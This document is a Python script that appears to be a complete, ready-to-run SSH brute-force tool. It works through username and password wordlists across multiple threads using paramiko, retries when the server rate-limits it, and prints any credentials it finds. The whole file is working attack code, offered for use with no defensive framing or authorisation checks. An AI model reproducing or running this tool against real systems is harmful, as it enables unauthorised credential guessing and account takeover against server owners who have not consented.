#!/usr/bin/env python3
"""
Usage:
python ssh_bruteforce.py -v --host 192.168.56.107 --port 22 -u wordlists/usernames.txt -p wordlists/passwords.txt --threads 5 --auth-timeout 0.1 --timeout 1

@author: Sardor Hazratov
"""

import socket
import traceback
from time import sleep
import paramiko
import argparse
import threading
import logging
from logger import Logger


logging.getLogger('paramiko').setLevel(logging.CRITICAL)
logger = Logger.get_logger('ssh_bruteforce')
logger.setLevel(logging.WARNING)

# DEFAULT VALUES
PORT = 22
THREADS = 3
TIMEOUT = 0.3
AUTH_TIMEOUT = 0.2

found = False
success_username = ''
success_password = ''


def bruteforce(host: str, port: int, usernames: list, passwords: list, timeout: float = TIMEOUT,
               auth_timeout: float = AUTH_TIMEOUT):
    """ Bruteforce (dictionary) attack """
    global found
    global success_username
    global success_password
    found_valid_creds = False
    for username in usernames:
        username = username.rstrip('\n')
        for password in passwords:
            password = password.rstrip('\n')
            if logger.level != logging.DEBUG:
                print(f'Trying {username} {password}' + ' ' * 10, end='\r', flush=True)
            retry = True
            # there might be error:  paramiko.ssh_exception.SSHException: Error reading SSH protocol banner
            # which raised when host ssh server cannot handle many requests | rate limits
            # change logging.getLogger('paramiko').setLevel(logging.ERROR) to see errors
            max_retry = 10
            while retry and max_retry:
                try:
                    ssh_connect(host, port, username, password, timeout, auth_timeout)
                    logger.info(f"Success => Username: {username} \t Password: {password}")
                    found_valid_creds = True
                    retry = False
                except paramiko.ssh_exception.AuthenticationException:
                    # not valid creds; just continue with the next username:password pairs
                    logger.info(f"Invalid username & password =>  {username}:{password}")
                    retry = False
                except paramiko.ssh_exception.SSHException as err:
                    # maybe resource exhausted
                    # retry
                    max_retry -= 1
                    sleep(0.5)
                    pass
                except socket.timeout:
                    print('!! Connection timed out. Host might be down.')
                    return
            if not max_retry:
                logger.warning("Host being overloaded, increase auth-timeout or reduce thread count")
            if found_valid_creds:
                success_password = password
                success_username = username
                found = True
                # break; return from function if valid credentials are found
                return
            if found:
                # break; stop thread if another thread found successful credentials
                return


def ssh_connect(host: str, port: int, username: str, password: str, timeout=TIMEOUT, auth_timeout=AUTH_TIMEOUT):
    client = paramiko.client.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, port=port, username=username, password=password,
                       allow_agent=False, look_for_keys=False, timeout=timeout, auth_timeout=auth_timeout)
    except:
        client.close()
        raise
    finally:
        client.close()


def list_split_to_worker_count(lst: list, workers: int):
    ll = len(lst)
    each = ll // workers
    return [(i * each, (i * each + each) if i * each + each < ll - i * each + each else None) for i in range(workers)]


def main(args):
    host = args.host
    port = args.port
    if args.verbose:
        logger.setLevel(logging.DEBUG)
    timeout = args.timeout
    auth_timeout = args.auth_timeout
    logger.debug(f'Script started')
    try:
        test_username = args.username or 'test'
        test_password = 'test'
        # test 1 connection before proceeding to brute forcing with threads
        # checks for connection timeout issue. if host is down no need to iterate over wordlists
        try:
            ssh_connect(host, port, test_username, test_password, timeout, auth_timeout)
        except socket.timeout:
            print('!! Connection timed out. Host might be down.')
            exit(0)
        except (Exception, ValueError):
            # ignore any other exception rather than socket.timeout
            pass

        if args.username:
            # single username mode
            usernames = [args.username]
            with open(args.password_wordlist) as passwords_f:
                passwords = passwords_f.readlines()
                # split password dictionary between worker threads
                list_ranges = list_split_to_worker_count(passwords, args.threads)
                threads = []
                for i, (s_ind, e_ind) in enumerate(list_ranges):
                    t = threading.Thread(name=f"BRUTEFORCE_THREAD{i}", daemon=True, target=bruteforce,
                                         args=(host, port, usernames, passwords[s_ind: e_ind], timeout, auth_timeout))
                    t.start()
                    threads.append(t)
                for t in threads:
                    t.join()
        else:
            # read wordlists | multiple usernames mode with wordlist
            with open(args.username_wordlist) as usernames_file:
                usernames = usernames_file.readlines()
                with open(args.password_wordlist) as passwords_f:
                    passwords = passwords_f.readlines()
                    # split username dictionary between worker threads
                    list_ranges = list_split_to_worker_count(usernames, args.threads)
                    threads = []
                    for i, (s_ind, e_ind) in enumerate(list_ranges):
                        t = threading.Thread(name=f"BRUTEFORCE_THREAD{i}", daemon=True, target=bruteforce,
                                             args=(
                                                 host, port, usernames[s_ind: e_ind], passwords, timeout, auth_timeout))
                        t.start()
                        threads.append(t)
                    for t in threads:
                        t.join()
    except Exception as err:
        logger.error(str(err))
        logger.error(traceback.format_exc())

    if found:
        print(f'Found valid credentials {success_username}:{success_password}@{host}')
    else:
        print('Could not find valid credentials from specified wordlists')


if __name__ == '__main__':
    SCRIPT_DESC = "Python script that makes dictionary attack against ssh servers"
    parser = argparse.ArgumentParser(prog='ssh_bruteforce', description=SCRIPT_DESC,
                                     epilog='By Sardor Hazratov')

    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Verbose')
    parser.add_argument('-u', '--username-wordlist', type=str, required=False,
                        help='Username wordlist, required when -U parameter not used')
    parser.add_argument('-U', '--username', type=str, required=False,
                        help='Username wordlist, required when -u parameter not used')
    parser.add_argument('-p', '--password-wordlist', type=str, required=True,
                        help='Password wordlist')
    parser.add_argument('--host', type=str, required=True,
                        help='Target host ip address')
    parser.add_argument('--port', type=int, required=False, default=PORT,
                        help=f'Target host ssh port, Default={PORT}')
    parser.add_argument('--threads', type=int, required=False, default=THREADS,
                        help=f'Threads, Default={THREADS}')
    parser.add_argument('--auth-timeout', type=float, required=False, default=AUTH_TIMEOUT,
                        help=f'SSH authentication timeout in seconds (also accepts float), Default={AUTH_TIMEOUT}')
    parser.add_argument('--timeout', type=float, required=False, default=TIMEOUT,
                        help=f'SSH connection timeout in seconds (also accepts float), Default={TIMEOUT}')

    arguments = parser.parse_args()
    if not (bool(arguments.username) ^ bool(arguments.username_wordlist)):
        parser.error("requires one of -u or -U option. should not be used with both options")

    main(arguments)
